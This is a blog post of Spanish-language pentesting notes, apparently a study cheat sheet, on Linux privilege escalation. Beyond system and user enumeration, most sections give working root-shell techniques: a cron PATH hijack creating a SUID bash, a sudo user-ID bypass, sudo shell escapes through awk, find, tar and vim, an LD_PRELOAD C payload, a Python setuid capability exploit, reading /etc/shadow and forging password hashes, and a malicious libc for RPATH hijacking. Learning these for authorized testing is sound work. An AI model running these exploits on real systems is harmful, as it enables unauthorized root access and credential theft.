---
title: Apuntes pentesting
date: 2026-04-16
author: h1dr0
tags: [tips, tech, devops, tutorial, pentesting]
category: Articulo
---

# Apuntes

## ESCALADA DE PRIVILEGIOS

### Información del sistema

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
echo $path
```

### Variables de entorno

```bash
(env || set) 2>/dev/null
```

### Kernel exploit

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

**Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8**: Dirty Cow exploit CVE-2016-5195 (DirtyCow)

### Sudo version

```bash
searchsploit sudo
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
sudo -u#-1 /bin/bash # sudo <= v1.28
```

### Procesos

```bash
ps aux
ps -ef
top -n 1
```

### Tareas Cron basadas en tiempo

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

#### Cron path

For example, inside `/etc/crontab` you can find the PATH:
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

> Note: The user "user" has writing privileges over `/home/user`

If inside this crontab the root user tries to execute some command or script without setting the path. For example:
```
* * * * root overwrite.sh
```

Then, you can get a root shell by using:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

Steps:
- Wait for cron job to be executed
- Run `/tmp/bash -p`
- The effective uid and gid will be set to the real uid and gid

### Servicios

```bash
time.service
systemctl show-environment
systemctl list-timers --all # Listar servicios ejecutados
```

Si tienen permisos de escritura podemos modificarlo para ejecutar comandos. Si puedes modificar un temporizador puedes hacer que ejecute alguna unidad systemd.existente (como un `.service` o un `.target`):

```
Unit=backdoor.service
```

#### Activar un temporizador

```bash
sudo systemctl enable backu2.timer
```

Resultado:
```
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

## Enumeración de red

### Hostname, hosts and DNS

```bash
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname
```

### Content of /etc/inetd.conf & /etc/xinetd.conf

```bash
cat /etc/inetd.conf /etc/xinetd.conf
```

### Interfaces

```bash
cat /etc/networks
(ifconfig || ip a)
```

### Neighbours

```bash
(arp -e || arp -a)
(route || ip n)
```

### Iptables rules

```bash
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)
```

### Files used by network services

```bash
lsof -i
```

### Puertos abiertos

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```

### Escanear toda la red

```bash
timeout 1 tcpdump
```

## Enumeración de usuarios

### Info about me

```bash
id || (whoami && groups) 2>/dev/null
```

### List all users

```bash
cat /etc/passwd | cut -d: -f1
```

### List users with console

```bash
cat /etc/passwd | grep "sh$"
```

### List superusers

```bash
awk -F: '($3 == "0") {print}' /etc/passwd
```

### Currently logged users

```bash
w
```

### Login history

```bash
last | tail
```

### Last log of each user

```bash
lastlog
```

### List all users and their groups

```bash
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
```

### Current user PGP keys

```bash
gpg --list-keys 2>/dev/null
```

## Búsqueda de archivos con permisos SUID

Este permiso tiene la capacidad de ejecutar el binario como el propietario.

### Verificar comandos con sudo

```bash
sudo -l
```

### Buscar todos los binarios con permisos SUID

```bash
find / -perm -4000 2>/dev/null
```

### Ejecutar comandos con SUID

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### Sudo -l NOPASSWD

Example output:
```bash
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```

Ejecutando sudo y el archivo podemos acceder como el propietario:

```bash
sudo vim -c '!sh'
```

Obtendremos una shell.

## LD_PRELOAD

`LD_PRELOAD` es una variable ambiental opcional que contiene una o más rutas a librerías compartidas. El loader las cargará antes de cualquier otra librería, incluyendo la librería de C runtime (`libc.so`). Esto se llama preloading.

Para evitar que este mecanismo se use como vector de ataque en binarios suid/sgid, el loader ignora `LD_PRELOAD` si `ruid != euid`. Para estos binarios solo las librerías en rutas estándar que también sean suid/sgid serán precargadas.

Si encuentras en la salida de `sudo -l` la línea:
```
env_keep+=LD_PRELOAD
```

Y puedes ejecutar algún comando con sudo, puedes escalar privilegios.

### Privilege Escalation via LD_PRELOAD

Crea `/tmp/pe.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Compila:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Escala privilegios:

```bash
sudo LD_PRELOAD=pe.so <COMMAND> # Usa cualquier comando que puedas ejecutar con sudo
```

## Capabilities

### Listar capabilities

```bash
getcap -r / 2>/dev/null
```

### Añadir una capability

```bash
setcap cap_setuid+ep /usr/bin/python2.7
```

Verifica:
```bash
/usr/bin/python2.7 = cap_setuid+ep
```

### Exploit

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

## Sesiones de Screen

### Listar sesiones

```bash
screen -ls
```

### Attach to session

```bash
screen -dr <session> # The -d is to detach whoever is attached to it
screen -dr 3350.foo # In the example of the image
```

## Sesiones de Tmux

### Listar sesiones

```bash
tmux ls
ps aux | grep tmux # Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls # List using that socket
```

> Hint: You can start a tmux session in that socket with: `tmux -S /tmp/dev_sess`

## Búsqueda de passwords

### Passwd equivalent files

```bash
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Shadow equivalent files

```bash
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

### Búsqueda de hashes

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Crear password para añadir en /etc/shadow

```bash
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

## Shared Library

### ldconfig

```bash
ldconfig
```

### Identify shared libraries with ldd

```bash
$ ldd /opt/binary
linux-vdso.so.1 (0x00007ffe961cd000)
vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)
```

### Create a library in /tmp and activate the path

```bash
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

## RPATH

### Check RPATH

```bash
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED) Shared library: [libc.so.6]
0x0000000f (RPATH) Library rpath: [/var/tmp/flag15]
```

### Check library dependencies

```bash
level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 => (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```

By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the RPATH variable.

```bash
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 => (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```

### Create an evil library in /var/tmp

```bash
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6
```

With this `exploit.c`:

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char , char ), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```

---

[Caido - A lightweight web security auditing toolkit](https://caido.io/)